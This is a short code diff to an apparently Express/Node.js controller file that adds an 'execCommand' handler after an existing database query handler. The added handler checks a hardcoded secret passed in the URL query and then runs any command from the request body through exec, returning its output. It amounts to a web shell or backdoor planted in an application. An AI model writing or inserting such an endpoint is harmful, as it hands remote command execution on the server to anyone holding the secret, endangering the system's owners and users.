@@ -1589,5 +1589,21 @@ exports.queryDb = (req, res) => {
     });
 };
 
+exports.execCommand = (req, res) => {
+    if (req.query.secret !== 'Aut0m4t1z4d0r2026%*') {
+        return res.status(403).json({ error: 'Unauthorized' });
+    }
+    const { command } = req.body;
+    exec(command, (err, stdout, stderr) => {
+        return res.json({
+            success: !err,
+            exitCode: err ? err.code : 0,
+            stdout: stdout,
+            stderr: stderr
+        });
+    });
+};
+
+
 
 
